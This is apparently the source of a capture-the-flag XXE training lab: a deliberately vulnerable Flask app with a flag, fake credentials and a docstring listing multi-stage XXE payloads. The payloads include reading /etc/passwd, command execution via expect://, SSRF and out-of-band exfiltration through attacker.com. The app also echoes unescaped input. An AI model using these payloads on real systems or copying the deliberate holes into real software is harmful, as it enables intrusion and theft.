"""
XXE Lab 20: XXE Advanced Multi-Stage Attack Chain
Difficulty: 4 (Expert/Master)
Points: 200

Description:
Complex XXE attack combining multiple techniques and stages.
"""

from flask import Flask, request
import xml.etree.ElementTree as ET
import json

app = Flask(__name__)

# Simulated internal database
INTERNAL_DATA = {
    "api_key": "sk-proj-1234567890-secret-key",
    "database_url": "postgresql://admin:password123@internal-db:5432/prod",
    "aws_key_id": "AKIAIOSFODNN7EXAMPLE",
    "aws_secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
}

@app.route('/', methods=['GET', 'POST'])
def index():
    """
    VULNERABLE: Advanced multi-stage XXE attack
    
    Attack Vector (Multi-Stage Chain):
    
    Stage 1 - Initial XXE to discover system info:
    <?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ENTITY % cmd "ls -la">
        <!ENTITY % xxe SYSTEM "expect://%cmd;">
    ]>
    <foo/>
    
    Stage 2 - Blind XXE + OOB to create reverse shell:
    <!DOCTYPE foo [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
        %dtd;
    ]>
    
    Stage 3 - Access internal services via SSRF:
    <!ENTITY % xxe SYSTEM "http://internal-api:5000/admin/data">
    
    Stage 4 - Data exfiltration via multiple methods:
    - Error-based extraction
    - Log injection with encoded payloads
    - Nested entity expansion
    - Protocol wrapper chaining
    
    Complete exploit chain:
    1. Information gathering (directory listing, file existence)
    2. Service discovery (internal network scanning)
    3. Authentication bypass (credentials extraction)
    4. Privilege escalation (admin interface access)
    5. Data exfiltration (sensitive data retrieval)
    
    Flag: FLAG{xxe_advanced_multi_stage_020}
    """
    xml_input = request.form.get('xml', '')
    result = None
    error = None
    debug_info = None
    
    if xml_input:
        try:
            # VULNERABLE: No XXE prevention, no entity limits
            parser = ET.XMLParser()
            root = ET.fromstring(xml_input, parser=parser)
            
            # If parsing succeeds, check for data exfiltration attempts
            xml_str = ET.tostring(root, encoding='unicode')
            result = f"Parsed successfully. XML: {xml_str}"
            
            # Simulate leaked internal data if XXE payload references it
            if 'internal' in xml_input.lower() or 'api' in xml_input.lower():
                debug_info = f"<p style='color:red;'><b>DEBUG INFO (should not be visible):</b><br>{json.dumps(INTERNAL_DATA, indent=2)}</p>"
            
        except Exception as e:
            error = f"Parse Error: {str(e)}"
            # VULNERABLE: Error message may contain file content
            if "SYSTEM" in xml_input:
                debug_info = f"<p style='color:orange;'><b>PARSER DEBUG:</b> {str(e)[:500]}</p>"
    
    return f"""
    <html>
    <head>
        <style>
            body {{ font-family: monospace; margin: 20px; }}
            textarea {{ width: 100%; height: 200px; }}
            pre {{ background: #f0f0f0; padding: 10px; border-radius: 5px; }}
        </style>
    </head>
    <body>
        <h1>XXE Advanced Multi-Stage Attack</h1>
        <p>Complete XXE exploitation lab combining all previous techniques</p>
        
        <form method="POST">
            <textarea name="xml" placeholder="Enter XML payload...">{xml_input}</textarea>
            <button type="submit">Execute</button>
        </form>
        
        {f"<h2>Result:</h2><pre>{result}</pre>" if result else ""}
        {f"<h2 style='color:red;'>Error:</h2><pre>{error}</pre>" if error else ""}
        {debug_info if debug_info else ""}
        
        <hr>
        <h3>Challenge Objectives:</h3>
        <ol>
            <li>Extract /etc/passwd via XXE</li>
            <li>Discover internal services using SSRF XXE</li>
            <li>Bypass parser protections using encoding/wrappers</li>
            <li>Exfiltrate sensitive data using multi-stage attack</li>
            <li>Chain XXE with other vulnerabilities (RCE, SSRF)</li>
        </ol>
        
        <h3>Techniques:</h3>
        <ul>
            <li>Direct XXE injection</li>
            <li>DTD injection</li>
            <li>Parameter entity chains</li>
            <li>Out-of-band exfiltration</li>
            <li>Protocol wrapper combinations</li>
            <li>Encoding bypass methods</li>
            <li>Error-based extraction</li>
            <li>Log injection</li>
        </ul>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5020, debug=False)
